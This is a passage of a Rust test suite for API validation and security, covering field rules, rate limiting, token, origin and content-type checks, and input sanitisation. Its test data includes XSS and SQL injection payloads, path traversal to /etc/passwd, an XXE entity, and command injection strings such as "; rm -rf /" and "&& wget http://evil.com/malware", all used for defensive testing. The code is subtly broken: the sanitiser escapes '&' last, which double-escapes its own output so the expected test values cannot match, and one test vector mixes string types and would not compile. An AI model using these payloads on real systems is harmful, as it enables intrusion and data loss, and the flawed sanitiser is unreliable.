//! API Validation and Security Tests
//! 
//! Tests for input validation, security measures, authentication,
//! and API safety mechanisms

use std::collections::HashMap;
use std::time::{Duration, Instant};
use tokio::test;
use pretty_assertions::assert_eq;

use webxr::errors::*;

#[derive(Debug, Clone)]
pub struct ValidationRule {
    pub field_name: String,
    pub required: bool,
    pub min_length: Option<usize>,
    pub max_length: Option<usize>,
    pub pattern: Option<String>,
    pub allowed_values: Option<Vec<String>>,
}

impl ValidationRule {
    pub fn required_field(name: &str) -> Self {
        Self {
            field_name: name.to_string(),
            required: true,
            min_length: None,
            max_length: None,
            pattern: None,
            allowed_values: None,
        }
    }
    
    pub fn optional_field(name: &str) -> Self {
        Self {
            field_name: name.to_string(),
            required: false,
            min_length: None,
            max_length: None,
            pattern: None,
            allowed_values: None,
        }
    }
    
    pub fn with_length_limits(mut self, min: Option<usize>, max: Option<usize>) -> Self {
        self.min_length = min;
        self.max_length = max;
        self
    }
    
    pub fn with_pattern(mut self, pattern: &str) -> Self {
        self.pattern = Some(pattern.to_string());
        self
    }
    
    pub fn with_allowed_values(mut self, values: Vec<&str>) -> Self {
        self.allowed_values = Some(values.iter().map(|s| s.to_string()).collect());
        self
    }
}

pub struct InputValidator {
    rules: HashMap<String, ValidationRule>,
}

impl InputValidator {
    pub fn new() -> Self {
        Self {
            rules: HashMap::new(),
        }
    }
    
    pub fn add_rule(&mut self, rule: ValidationRule) {
        self.rules.insert(rule.field_name.clone(), rule);
    }
    
    pub fn validate(&self, input: &HashMap<String, String>) -> Result<(), SettingsError> {
        // Check required fields
        for rule in self.rules.values() {
            if rule.required && !input.contains_key(&rule.field_name) {
                return Err(SettingsError::ValidationFailed {
                    setting_path: rule.field_name.clone(),
                    reason: "Required field is missing".to_string(),
                });
            }
        }
        
        // Validate present fields
        for (field_name, value) in input {
            if let Some(rule) = self.rules.get(field_name) {
                self.validate_field(rule, value)?;
            } else {
                // Unknown field - could be allowed or rejected based on policy
                return Err(SettingsError::ValidationFailed {
                    setting_path: field_name.clone(),
                    reason: "Unknown field not allowed".to_string(),
                });
            }
        }
        
        Ok(())
    }
    
    fn validate_field(&self, rule: &ValidationRule, value: &str) -> Result<(), SettingsError> {
        // Check length constraints
        if let Some(min_len) = rule.min_length {
            if value.len() < min_len {
                return Err(SettingsError::ValidationFailed {
                    setting_path: rule.field_name.clone(),
                    reason: format!("Value too short, minimum length is {}", min_len),
                });
            }
        }
        
        if let Some(max_len) = rule.max_length {
            if value.len() > max_len {
                return Err(SettingsError::ValidationFailed {
                    setting_path: rule.field_name.clone(),
                    reason: format!("Value too long, maximum length is {}", max_len),
                });
            }
        }
        
        // Check pattern matching
        if let Some(pattern) = &rule.pattern {
            // Simple pattern matching for tests (not full regex)
            match pattern.as_str() {
                "email" => {
                    if !value.contains("@") || !value.contains(".") {
                        return Err(SettingsError::ValidationFailed {
                            setting_path: rule.field_name.clone(),
                            reason: "Invalid email format".to_string(),
                        });
                    }
                },
                "numeric" => {
                    if value.parse::<f64>().is_err() {
                        return Err(SettingsError::ValidationFailed {
                            setting_path: rule.field_name.clone(),
                            reason: "Value must be numeric".to_string(),
                        });
                    }
                },
                "alphanumeric" => {
                    if !value.chars().all(|c| c.is_alphanumeric()) {
                        return Err(SettingsError::ValidationFailed {
                            setting_path: rule.field_name.clone(),
                            reason: "Value must contain only alphanumeric characters".to_string(),
                        });
                    }
                },
                _ => {
                    // For testing, just check if pattern string appears in value
                    if !value.contains(pattern) {
                        return Err(SettingsError::ValidationFailed {
                            setting_path: rule.field_name.clone(),
                            reason: format!("Value does not match required pattern: {}", pattern),
                        });
                    }
                }
            }
        }
        
        // Check allowed values
        if let Some(allowed) = &rule.allowed_values {
            if !allowed.contains(&value.to_string()) {
                return Err(SettingsError::ValidationFailed {
                    setting_path: rule.field_name.clone(),
                    reason: format!("Value not in allowed list: {:?}", allowed),
                });
            }
        }
        
        Ok(())
    }
}

#[derive(Debug, Clone)]
pub struct SecurityPolicy {
    pub max_request_size: usize,
    pub rate_limit_per_minute: usize,
    pub allowed_origins: Vec<String>,
    pub require_authentication: bool,
    pub sanitize_inputs: bool,
    pub validate_content_type: bool,
}

impl Default for SecurityPolicy {
    fn default() -> Self {
        Self {
            max_request_size: 1024 * 1024, // 1MB
            rate_limit_per_minute: 60,
            allowed_origins: vec!["https://localhost".to_string()],
            require_authentication: true,
            sanitize_inputs: true,
            validate_content_type: true,
        }
    }
}

pub struct SecurityValidator {
    policy: SecurityPolicy,
    request_counts: HashMap<String, (Instant, usize)>, // client_id -> (window_start, count)
}

impl SecurityValidator {
    pub fn new(policy: SecurityPolicy) -> Self {
        Self {
            policy,
            request_counts: HashMap::new(),
        }
    }
    
    pub fn validate_request(&mut self, 
                          client_id: &str,
                          origin: Option<&str>,
                          content_type: Option<&str>,
                          content_length: usize,
                          auth_token: Option<&str>) -> Result<(), NetworkError> {
        
        // Check request size
        if content_length > self.policy.max_request_size {
            return Err(NetworkError::HTTPError {
                url: "request_validation".to_string(),
                status: Some(413),
                reason: format!("Request too large: {} bytes, max: {} bytes", 
                               content_length, self.policy.max_request_size),
            });
        }
        
        // Check rate limiting
        self.check_rate_limit(client_id)?;
        
        // Check origin
        if let Some(origin) = origin {
            if !self.policy.allowed_origins.contains(&origin.to_string()) {
                return Err(NetworkError::HTTPError {
                    url: "origin_validation".to_string(),
                    status: Some(403),
                    reason: format!("Origin not allowed: {}", origin),
                });
            }
        }
        
        // Check content type
        if self.policy.validate_content_type {
            if let Some(content_type) = content_type {
                if !self.is_allowed_content_type(content_type) {
                    return Err(NetworkError::HTTPError {
                        url: "content_type_validation".to_string(),
                        status: Some(415),
                        reason: format!("Unsupported content type: {}", content_type),
                    });
                }
            } else {
                return Err(NetworkError::HTTPError {
                    url: "content_type_validation".to_string(),
                    status: Some(400),
                    reason: "Content-Type header required".to_string(),
                });
            }
        }
        
        // Check authentication
        if self.policy.require_authentication {
            if auth_token.is_none() {
                return Err(NetworkError::HTTPError {
                    url: "authentication".to_string(),
                    status: Some(401),
                    reason: "Authentication token required".to_string(),
                });
            }
            
            if let Some(token) = auth_token {
                if !self.validate_auth_token(token) {
                    return Err(NetworkError::HTTPError {
                        url: "authentication".to_string(),
                        status: Some(401),
                        reason: "Invalid authentication token".to_string(),
                    });
                }
            }
        }
        
        Ok(())
    }
    
    fn check_rate_limit(&mut self, client_id: &str) -> Result<(), NetworkError> {
        let now = Instant::now();
        let window_duration = Duration::from_secs(60); // 1 minute window
        
        let (window_start, count) = self.request_counts
            .get(client_id)
            .cloned()
            .unwrap_or((now, 0));
        
        if now.duration_since(window_start) > window_duration {
            // Reset window
            self.request_counts.insert(client_id.to_string(), (now, 1));
            Ok(())
        } else if count >= self.policy.rate_limit_per_minute {
            Err(NetworkError::HTTPError {
                url: "rate_limit".to_string(),
                status: Some(429),
                reason: format!("Rate limit exceeded: {} requests per minute", 
                               self.policy.rate_limit_per_minute),
            })
        } else {
            self.request_counts.insert(client_id.to_string(), (window_start, count + 1));
            Ok(())
        }
    }
    
    fn is_allowed_content_type(&self, content_type: &str) -> bool {
        let allowed_types = [
            "application/json",
            "application/x-www-form-urlencoded",
            "multipart/form-data",
            "text/plain",
        ];
        
        allowed_types.iter().any(|&allowed| content_type.starts_with(allowed))
    }
    
    fn validate_auth_token(&self, token: &str) -> bool {
        // Simple token validation for testing
        !token.is_empty() && token.len() >= 10 && !token.contains("invalid")
    }
    
    pub fn sanitize_input(&self, input: &str) -> String {
        if !self.policy.sanitize_inputs {
            return input.to_string();
        }
        
        // Basic input sanitization
        input
            .replace("<script>", "&lt;script&gt;")
            .replace("</script>", "&lt;/script&gt;")
            .replace("<", "&lt;")
            .replace(">", "&gt;")
            .replace("\"", "&quot;")
            .replace("'", "&#x27;")
            .replace("&", "&amp;")
    }
}

#[derive(Debug)]
pub struct APIValidationTestSuite {
    test_count: usize,
    passed_tests: usize,
    failed_tests: usize,
    security_violations_detected: usize,
    input_validation_failures: usize,
}

impl APIValidationTestSuite {
    pub fn new() -> Self {
        Self {
            test_count: 0,
            passed_tests: 0,
            failed_tests: 0,
            security_violations_detected: 0,
            input_validation_failures: 0,
        }
    }

    pub async fn run_all_tests(&mut self) {
        println!("Running API Validation and Security Tests...");

        self.test_input_validation_rules().await;
        self.test_field_validation_constraints().await;
        self.test_security_policy_enforcement().await;
        self.test_rate_limiting().await;
        self.test_authentication_validation().await;
        self.test_origin_validation().await;
        self.test_content_type_validation().await;
        self.test_request_size_limits().await;
        self.test_input_sanitization().await;
        self.test_xss_prevention().await;
        self.test_sql_injection_prevention().await;
        self.test_buffer_overflow_prevention().await;
        self.test_malicious_input_handling().await;
        self.test_concurrent_security_validation().await;
        self.test_error_information_leakage().await;
        self.test_api_versioning_security().await;

        self.print_results();
    }

    async fn test_input_validation_rules(&mut self) {
        let test_name = "input_validation_rules";
        let start = Instant::now();
        let mut all_passed = true;

        let mut validator = InputValidator::new();
        
        // Add validation rules
        validator.add_rule(ValidationRule::required_field("username")
            .with_length_limits(Some(3), Some(20))
            .with_pattern("alphanumeric"));
        
        validator.add_rule(ValidationRule::required_field("email")
            .with_pattern("email"));
        
        validator.add_rule(ValidationRule::optional_field("age")
            .with_pattern("numeric"));
        
        validator.add_rule(ValidationRule::required_field("role")
            .with_allowed_values(vec!["admin", "user", "guest"]));

        // Test valid input
        let mut valid_input = HashMap::new();
        valid_input.insert("username".to_string(), "alice123".to_string());
        valid_input.insert("email".to_string(), "alice@example.com".to_string());
        valid_input.insert("age".to_string(), "25".to_string());
        valid_input.insert("role".to_string(), "user".to_string());

        let result = validator.validate(&valid_input);
        if result.is_err() {
            eprintln!("Valid input should pass validation: {:?}", result.err());
            all_passed = false;
        }

        // Test missing required field
        let mut missing_field = valid_input.clone();
        missing_field.remove("username");
        
        let result = validator.validate(&missing_field);
        if result.is_ok() {
            eprintln!("Missing required field should fail validation");
            all_passed = false;
            self.input_validation_failures += 1;
        }

        // Test field too short
        let mut short_field = valid_input.clone();
        short_field.insert("username".to_string(), "ab".to_string());
        
        let result = validator.validate(&short_field);
        if result.is_ok() {
            eprintln!("Username too short should fail validation");
            all_passed = false;
            self.input_validation_failures += 1;
        }

        // Test field too long
        let mut long_field = valid_input.clone();
        long_field.insert("username".to_string(), "a".repeat(25));
        
        let result = validator.validate(&long_field);
        if result.is_ok() {
            eprintln!("Username too long should fail validation");
            all_passed = false;
            self.input_validation_failures += 1;
        }

        // Test invalid email pattern
        let mut invalid_email = valid_input.clone();
        invalid_email.insert("email".to_string(), "not-an-email".to_string());
        
        let result = validator.validate(&invalid_email);
        if result.is_ok() {
            eprintln!("Invalid email should fail validation");
            all_passed = false;
            self.input_validation_failures += 1;
        }

        // Test invalid numeric field
        let mut invalid_numeric = valid_input.clone();
        invalid_numeric.insert("age".to_string(), "not-a-number".to_string());
        
        let result = validator.validate(&invalid_numeric);
        if result.is_ok() {
            eprintln!("Non-numeric age should fail validation");
            all_passed = false;
            self.input_validation_failures += 1;
        }

        // Test invalid role
        let mut invalid_role = valid_input.clone();
        invalid_role.insert("role".to_string(), "invalid_role".to_string());
        
        let result = validator.validate(&invalid_role);
        if result.is_ok() {
            eprintln!("Invalid role should fail validation");
            all_passed = false;
            self.input_validation_failures += 1;
        }

        // Test unknown field
        let mut unknown_field = valid_input.clone();
        unknown_field.insert("unknown_field".to_string(), "value".to_string());
        
        let result = validator.validate(&unknown_field);
        if result.is_ok() {
            eprintln!("Unknown field should fail validation");
            all_passed = false;
            self.input_validation_failures += 1;
        }

        self.record_test_result(test_name, start.elapsed(), all_passed);
    }

    async fn test_field_validation_constraints(&mut self) {
        let test_name = "field_validation_constraints";
        let start = Instant::now();
        let mut all_passed = true;

        let mut validator = InputValidator::new();
        
        // Test various constraint combinations
        validator.add_rule(ValidationRule::required_field("password")
            .with_length_limits(Some(8), Some(128)));
        
        validator.add_rule(ValidationRule::optional_field("description")
            .with_length_limits(None, Some(500)));

        // Test boundary conditions
        let test_cases = vec![
            ("password", "1234567", false),   // Too short (7 chars)
            ("password", "12345678", true),   // Minimum length (8 chars)
            ("password", "a".repeat(128), true), // Maximum length
            ("password", "a".repeat(129), false), // Too long
            ("description", "", true),        // Optional field can be empty
            ("description", "a".repeat(500), true), // Maximum length
            ("description", "a".repeat(501), false), // Too long
        ];

        for (field, value, should_pass) in test_cases {
            let mut input = HashMap::new();
            input.insert(field.to_string(), value.to_string());
            
            // Add required password if testing description
            if field == "description" {
                input.insert("password".to_string(), "validpassword".to_string());
            }

            let result = validator.validate(&input);
            
            if should_pass && result.is_err() {
                eprintln!("Field '{}' with value '{}' should pass but failed: {:?}", 
                         field, value, result.err());
                all_passed = false;
            } else if !should_pass && result.is_ok() {
                eprintln!("Field '{}' with value '{}' should fail but passed", field, value);
                all_passed = false;
                self.input_validation_failures += 1;
            }
        }

        self.record_test_result(test_name, start.elapsed(), all_passed);
    }

    async fn test_security_policy_enforcement(&mut self) {
        let test_name = "security_policy_enforcement";
        let start = Instant::now();
        let mut all_passed = true;

        let policy = SecurityPolicy {
            max_request_size: 1024,
            rate_limit_per_minute: 5,
            allowed_origins: vec!["https://trusted.com".to_string()],
            require_authentication: true,
            sanitize_inputs: true,
            validate_content_type: true,
        };

        let mut security_validator = SecurityValidator::new(policy);

        // Test valid request
        let result = security_validator.validate_request(
            "client1",
            Some("https://trusted.com"),
            Some("application/json"),
            512,
            Some("valid_token_123")
        );

        if result.is_err() {
            eprintln!("Valid request should pass security validation: {:?}", result.err());
            all_passed = false;
        }

        // Test request too large
        let result = security_validator.validate_request(
            "client2",
            Some("https://trusted.com"),
            Some("application/json"),
            2048, // Exceeds max_request_size of 1024
            Some("valid_token_123")
        );

        if result.is_ok() {
            eprintln!("Oversized request should be rejected");
            all_passed = false;
            self.security_violations_detected += 1;
        } else {
            match result.err().unwrap() {
                NetworkError::HTTPError { status: Some(413), .. } => {
                    // Expected error code for request too large
                },
                _ => {
                    eprintln!("Should get HTTP 413 for oversized request");
                    all_passed = false;
                }
            }
        }

        // Test untrusted origin
        let result = security_validator.validate_request(
            "client3",
            Some("https://malicious.com"),
            Some("application/json"),
            512,
            Some("valid_token_123")
        );

        if result.is_ok() {
            eprintln!("Request from untrusted origin should be rejected");
            all_passed = false;
            self.security_violations_detected += 1;
        }

        // Test missing authentication
        let result = security_validator.validate_request(
            "client4",
            Some("https://trusted.com"),
            Some("application/json"),
            512,
            None // No auth token
        );

        if result.is_ok() {
            eprintln!("Request without authentication should be rejected");
            all_passed = false;
            self.security_violations_detected += 1;
        }

        self.record_test_result(test_name, start.elapsed(), all_passed);
    }

    async fn test_rate_limiting(&mut self) {
        let test_name = "rate_limiting";
        let start = Instant::now();
        let mut all_passed = true;

        let policy = SecurityPolicy {
            rate_limit_per_minute: 3,
            ..SecurityPolicy::default()
        };

        let mut security_validator = SecurityValidator::new(policy);
        let client_id = "rate_test_client";

        // Make requests up to the limit
        for i in 0..3 {
            let result = security_validator.validate_request(
                client_id,
                Some("https://localhost"),
                Some("application/json"),
                100,
                Some("valid_token_123")
            );

            if result.is_err() {
                eprintln!("Request {} within rate limit should succeed: {:?}", i, result.err());
                all_passed = false;
            }
        }

        // Next request should be rate limited
        let result = security_validator.validate_request(
            client_id,
            Some("https://localhost"),
            Some("application/json"),
            100,
            Some("valid_token_123")
        );

        if result.is_ok() {
            eprintln!("Request exceeding rate limit should be rejected");
            all_passed = false;
            self.security_violations_detected += 1;
        } else {
            match result.err().unwrap() {
                NetworkError::HTTPError { status: Some(429), .. } => {
                    // Expected rate limit error
                },
                _ => {
                    eprintln!("Should get HTTP 429 for rate limit exceeded");
                    all_passed = false;
                }
            }
        }

        // Different client should not be affected
        let result = security_validator.validate_request(
            "different_client",
            Some("https://localhost"),
            Some("application/json"),
            100,
            Some("valid_token_123")
        );

        if result.is_err() {
            eprintln!("Different client should not be affected by rate limiting: {:?}", result.err());
            all_passed = false;
        }

        self.record_test_result(test_name, start.elapsed(), all_passed);
    }

    async fn test_authentication_validation(&mut self) {
        let test_name = "authentication_validation";
        let start = Instant::now();
        let mut all_passed = true;

        let policy = SecurityPolicy::default();
        let mut security_validator = SecurityValidator::new(policy);

        // Test valid authentication tokens
        let valid_tokens = vec![
            "valid_token_123",
            "bearer_token_456",
            "jwt_token_789abc",
        ];

        for token in valid_tokens {
            let result = security_validator.validate_request(
                "client1",
                Some("https://localhost"),
                Some("application/json"),
                100,
                Some(token)
            );

            if result.is_err() {
                eprintln!("Valid token '{}' should be accepted: {:?}", token, result.err());
                all_passed = false;
            }
        }

        // Test invalid authentication tokens
        let invalid_tokens = vec![
            "",                    // Empty token
            "short",              // Too short
            "invalid_token",      // Contains "invalid"
        ];

        for token in invalid_tokens {
            let result = security_validator.validate_request(
                "client2",
                Some("https://localhost"),
                Some("application/json"),
                100,
                Some(token)
            );

            if result.is_ok() {
                eprintln!("Invalid token '{}' should be rejected", token);
                all_passed = false;
                self.security_violations_detected += 1;
            }
        }

        // Test policy with authentication disabled
        let no_auth_policy = SecurityPolicy {
            require_authentication: false,
            ..SecurityPolicy::default()
        };

        let mut no_auth_validator = SecurityValidator::new(no_auth_policy);

        let result = no_auth_validator.validate_request(
            "client3",
            Some("https://localhost"),
            Some("application/json"),
            100,
            None // No token should be okay
        );

        if result.is_err() {
            eprintln!("Request without token should pass when authentication is disabled: {:?}", result.err());
            all_passed = false;
        }

        self.record_test_result(test_name, start.elapsed(), all_passed);
    }

    async fn test_origin_validation(&mut self) {
        let test_name = "origin_validation";
        let start = Instant::now();
        let mut all_passed = true;

        let policy = SecurityPolicy {
            allowed_origins: vec![
                "https://app.example.com".to_string(),
                "https://admin.example.com".to_string(),
                "http://localhost:3000".to_string(),
            ],
            ..SecurityPolicy::default()
        };

        let mut security_validator = SecurityValidator::new(policy);

        // Test allowed origins
        let allowed_origins = vec![
            "https://app.example.com",
            "https://admin.example.com",
            "http://localhost:3000",
        ];

        for origin in allowed_origins {
            let result = security_validator.validate_request(
                "client1",
                Some(origin),
                Some("application/json"),
                100,
                Some("valid_token_123")
            );

            if result.is_err() {
                eprintln!("Allowed origin '{}' should be accepted: {:?}", origin, result.err());
                all_passed = false;
            }
        }

        // Test disallowed origins
        let disallowed_origins = vec![
            "https://malicious.com",
            "http://evil.example.com",
            "https://phishing.net",
            "javascript://evil.com",
        ];

        for origin in disallowed_origins {
            let result = security_validator.validate_request(
                "client2",
                Some(origin),
                Some("application/json"),
                100,
                Some("valid_token_123")
            );

            if result.is_ok() {
                eprintln!("Disallowed origin '{}' should be rejected", origin);
                all_passed = false;
                self.security_violations_detected += 1;
            }
        }

        // Test missing origin (should be handled gracefully)
        let result = security_validator.validate_request(
            "client3",
            None,
            Some("application/json"),
            100,
            Some("valid_token_123")
        );

        // Missing origin might be allowed or rejected based on policy
        // For this test, we'll allow it since the origin check only applies when present
        if result.is_err() {
            eprintln!("Missing origin should be handled gracefully: {:?}", result.err());
            all_passed = false;
        }

        self.record_test_result(test_name, start.elapsed(), all_passed);
    }

    async fn test_content_type_validation(&mut self) {
        let test_name = "content_type_validation";
        let start = Instant::now();
        let mut all_passed = true;

        let policy = SecurityPolicy::default();
        let mut security_validator = SecurityValidator::new(policy);

        // Test allowed content types
        let allowed_types = vec![
            "application/json",
            "application/json; charset=utf-8",
            "application/x-www-form-urlencoded",
            "multipart/form-data",
            "text/plain",
        ];

        for content_type in allowed_types {
            let result = security_validator.validate_request(
                "client1",
                Some("https://localhost"),
                Some(content_type),
                100,
                Some("valid_token_123")
            );

            if result.is_err() {
                eprintln!("Allowed content type '{}' should be accepted: {:?}", content_type, result.err());
                all_passed = false;
            }
        }

        // Test disallowed content types
        let disallowed_types = vec![
            "text/html",
            "application/xml",
            "image/png",
            "application/octet-stream",
        ];

        for content_type in disallowed_types {
            let result = security_validator.validate_request(
                "client2",
                Some("https://localhost"),
                Some(content_type),
                100,
                Some("valid_token_123")
            );

            if result.is_ok() {
                eprintln!("Disallowed content type '{}' should be rejected", content_type);
                all_passed = false;
                self.security_violations_detected += 1;
            }
        }

        // Test missing content type
        let result = security_validator.validate_request(
            "client3",
            Some("https://localhost"),
            None,
            100,
            Some("valid_token_123")
        );

        if result.is_ok() {
            eprintln!("Missing content type should be rejected when validation is enabled");
            all_passed = false;
            self.security_violations_detected += 1;
        }

        // Test with content type validation disabled
        let no_validation_policy = SecurityPolicy {
            validate_content_type: false,
            ..SecurityPolicy::default()
        };

        let mut no_validation_validator = SecurityValidator::new(no_validation_policy);

        let result = no_validation_validator.validate_request(
            "client4",
            Some("https://localhost"),
            None, // Missing content type
            100,
            Some("valid_token_123")
        );

        if result.is_err() {
            eprintln!("Missing content type should be allowed when validation is disabled: {:?}", result.err());
            all_passed = false;
        }

        self.record_test_result(test_name, start.elapsed(), all_passed);
    }

    async fn test_request_size_limits(&mut self) {
        let test_name = "request_size_limits";
        let start = Instant::now();
        let mut all_passed = true;

        let policy = SecurityPolicy {
            max_request_size: 1024, // 1KB limit
            ..SecurityPolicy::default()
        };

        let mut security_validator = SecurityValidator::new(policy);

        // Test requests within size limit
        let valid_sizes = vec![0, 1, 512, 1023, 1024];

        for size in valid_sizes {
            let result = security_validator.validate_request(
                "client1",
                Some("https://localhost"),
                Some("application/json"),
                size,
                Some("valid_token_123")
            );

            if result.is_err() {
                eprintln!("Request size {} should be allowed (limit: 1024): {:?}", size, result.err());
                all_passed = false;
            }
        }

        // Test requests exceeding size limit
        let invalid_sizes = vec![1025, 2048, 1024 * 1024];

        for size in invalid_sizes {
            let result = security_validator.validate_request(
                "client2",
                Some("https://localhost"),
                Some("application/json"),
                size,
                Some("valid_token_123")
            );

            if result.is_ok() {
                eprintln!("Request size {} should be rejected (limit: 1024)", size);
                all_passed = false;
                self.security_violations_detected += 1;
            } else {
                match result.err().unwrap() {
                    NetworkError::HTTPError { status: Some(413), .. } => {
                        // Expected "Payload Too Large" error
                    },
                    _ => {
                        eprintln!("Should get HTTP 413 for oversized request");
                        all_passed = false;
                    }
                }
            }
        }

        self.record_test_result(test_name, start.elapsed(), all_passed);
    }

    async fn test_input_sanitization(&mut self) {
        let test_name = "input_sanitization";
        let start = Instant::now();
        let mut all_passed = true;

        let policy = SecurityPolicy::default();
        let security_validator = SecurityValidator::new(policy);

        // Test HTML/XSS sanitization
        let test_cases = vec![
            ("<script>alert('xss')</script>", "&lt;script&gt;alert('xss')&lt;/script&gt;"),
            ("<img src='x' onerror='alert(1)'>", "&lt;img src=&#x27;x&#x27; onerror=&#x27;alert(1)&#x27;&gt;"),
            ("Normal text", "Normal text"),
            ("<b>Bold</b>", "&lt;b&gt;Bold&lt;/b&gt;"),
            ("\"quotes\"", "&quot;quotes&quot;"),
            ("'single quotes'", "&#x27;single quotes&#x27;"),
            ("&amp; symbols", "&amp;&amp; symbols"),
        ];

        for (input, expected) in test_cases {
            let sanitized = security_validator.sanitize_input(input);
            
            if sanitized != expected {
                eprintln!("Input '{}' not sanitized correctly: expected '{}', got '{}'", 
                         input, expected, sanitized);
                all_passed = false;
            }
        }

        // Test sanitization disabled
        let no_sanitize_policy = SecurityPolicy {
            sanitize_inputs: false,
            ..SecurityPolicy::default()
        };

        let no_sanitize_validator = SecurityValidator::new(no_sanitize_policy);

        let dangerous_input = "<script>alert('xss')</script>";
        let sanitized = no_sanitize_validator.sanitize_input(dangerous_input);
        
        if sanitized != dangerous_input {
            eprintln!("Input should not be sanitized when sanitization is disabled");
            all_passed = false;
        }

        self.record_test_result(test_name, start.elapsed(), all_passed);
    }

    async fn test_xss_prevention(&mut self) {
        let test_name = "xss_prevention";
        let start = Instant::now();
        let mut all_passed = true;

        let policy = SecurityPolicy::default();
        let security_validator = SecurityValidator::new(policy);

        // Test various XSS attack vectors
        let xss_payloads = vec![
            "<script>alert('XSS')</script>",
            "javascript:alert('XSS')",
            "<img src='x' onerror='alert(1)'>",
            "<svg onload='alert(1)'>",
            "';alert('XSS');//",
            "<iframe src='javascript:alert(1)'></iframe>",
            "<body onload='alert(1)'>",
            "<<SCRIPT>alert('XSS')</SCRIPT>",
        ];

        for payload in xss_payloads {
            let sanitized = security_validator.sanitize_input(payload);
            
            // Check that dangerous elements are escaped
            if sanitized.contains("<script>") || 
               sanitized.contains("javascript:") || 
               sanitized.contains("onerror=") ||
               sanitized.contains("onload=") {
                eprintln!("XSS payload not properly sanitized: '{}' -> '{}'", payload, sanitized);
                all_passed = false;
                self.security_violations_detected += 1;
            }
        }

        // Test that legitimate content is preserved
        let legitimate_inputs = vec![
            "Hello, World!",
            "User Name: John Doe",
            "Email: user@example.com",
            "Price: $29.99",
            "Description: A great product with 5 stars!",
        ];

        for input in legitimate_inputs {
            let sanitized = security_validator.sanitize_input(input);
            
            // For legitimate content, only & should be escaped to &amp;
            let expected = input.replace("&", "&amp;");
            if sanitized != expected {
                eprintln!("Legitimate input modified unexpectedly: '{}' -> '{}' (expected '{}')", 
                         input, sanitized, expected);
                all_passed = false;
            }
        }

        self.record_test_result(test_name, start.elapsed(), all_passed);
    }

    async fn test_sql_injection_prevention(&mut self) {
        let test_name = "sql_injection_prevention";
        let start = Instant::now();
        let mut all_passed = true;

        let mut validator = InputValidator::new();
        validator.add_rule(ValidationRule::required_field("user_id")
            .with_pattern("numeric"));
        validator.add_rule(ValidationRule::required_field("username")
            .with_pattern("alphanumeric"));

        // Test SQL injection payloads
        let sql_injection_payloads = vec![
            "1' OR '1'='1",
            "'; DROP TABLE users; --",
            "1; DELETE FROM users WHERE 1=1; --",
            "admin'/*",
            "1' UNION SELECT * FROM passwords--",
            "'; INSERT INTO admin_users VALUES('hacker','password'); --",
        ];

        for payload in sql_injection_payloads {
            let mut input = HashMap::new();
            input.insert("user_id".to_string(), payload.to_string());
            input.insert("username".to_string(), "testuser".to_string());

            let result = validator.validate(&input);
            
            if result.is_ok() {
                eprintln!("SQL injection payload should be rejected: '{}'", payload);
                all_passed = false;
                self.security_violations_detected += 1;
            }
        }

        // Test that legitimate numeric and alphanumeric inputs pass
        let legitimate_inputs = vec![
            ("123", "validuser"),
            ("456", "user123"),
            ("789", "testaccount"),
        ];

        for (user_id, username) in legitimate_inputs {
            let mut input = HashMap::new();
            input.insert("user_id".to_string(), user_id.to_string());
            input.insert("username".to_string(), username.to_string());

            let result = validator.validate(&input);
            
            if result.is_err() {
                eprintln!("Legitimate input should pass validation: user_id='{}', username='{}': {:?}", 
                         user_id, username, result.err());
                all_passed = false;
            }
        }

        self.record_test_result(test_name, start.elapsed(), all_passed);
    }

    async fn test_buffer_overflow_prevention(&mut self) {
        let test_name = "buffer_overflow_prevention";
        let start = Instant::now();
        let mut all_passed = true;

        let mut validator = InputValidator::new();
        validator.add_rule(ValidationRule::required_field("comment")
            .with_length_limits(Some(1), Some(1000)));
        validator.add_rule(ValidationRule::required_field("title")
            .with_length_limits(Some(1), Some(100)));

        // Test buffer overflow attempts
        let overflow_attempts = vec![
            ("comment", "A".repeat(10000)),  // Way too long
            ("comment", "B".repeat(5000)),   // Still too long  
            ("title", "C".repeat(1000)),     // Too long for title
            ("title", "D".repeat(500)),      // Still too long
        ];

        for (field, value) in overflow_attempts {
            let mut input = HashMap::new();
            input.insert(field.to_string(), value.clone());
            
            // Add other required fields
            if field != "comment" {
                input.insert("comment".to_string(), "Valid comment".to_string());
            }
            if field != "title" {
                input.insert("title".to_string(), "Valid title".to_string());
            }

            let result = validator.validate(&input);
            
            if result.is_ok() {
                eprintln!("Buffer overflow attempt should be rejected: field='{}', length={}", 
                         field, value.len());
                all_passed = false;
                self.security_violations_detected += 1;
            }
        }

        // Test maximum allowed lengths
        let max_length_tests = vec![
            ("comment", "A".repeat(1000)),  // Exactly at limit
            ("comment", "B".repeat(999)),   // Just under limit
            ("title", "C".repeat(100)),     // Exactly at limit
            ("title", "D".repeat(99)),      // Just under limit
        ];

        for (field, value) in max_length_tests {
            let mut input = HashMap::new();
            input.insert(field.to_string(), value.clone());
            
            // Add other required fields
            if field != "comment" {
                input.insert("comment".to_string(), "Valid comment".to_string());
            }
            if field != "title" {
                input.insert("title".to_string(), "Valid title".to_string());
            }

            let result = validator.validate(&input);
            
            if result.is_err() {
                eprintln!("Maximum length input should be allowed: field='{}', length={}: {:?}", 
                         field, value.len(), result.err());
                all_passed = false;
            }
        }

        self.record_test_result(test_name, start.elapsed(), all_passed);
    }

    async fn test_malicious_input_handling(&mut self) {
        let test_name = "malicious_input_handling";
        let start = Instant::now();
        let mut all_passed = true;

        let policy = SecurityPolicy::default();
        let security_validator = SecurityValidator::new(policy);

        // Test various malicious input patterns
        let malicious_inputs = vec![
            // Path traversal
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            
            // Command injection
            "; rm -rf /",
            "| cat /etc/passwd",
            "&& wget http://evil.com/malware",
            
            // LDAP injection
            "*)(uid=*",
            "*)(|(password=*))",
            
            // XML/XXE attacks
            "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/passwd'>]>",
            
            // NoSQL injection
            "{\"$ne\": null}",
            "{\"$where\": \"this.password == 'password' || '1'=='1'\"}",
        ];

        for input in malicious_inputs {
            let sanitized = security_validator.sanitize_input(input);
            
            // Check that dangerous characters are escaped
            if sanitized.contains("../") || 
               sanitized.contains("..\\") ||
               sanitized.contains("<!ENTITY") ||
               sanitized.contains("$ne") ||
               sanitized.contains("$where") {
                eprintln!("Malicious input not properly sanitized: '{}' -> '{}'", input, sanitized);
                all_passed = false;
                self.security_violations_detected += 1;
            }
        }

        // Test input validation catches patterns
        let mut validator = InputValidator::new();
        validator.add_rule(ValidationRule::required_field("filename")
            .with_pattern("alphanumeric"));

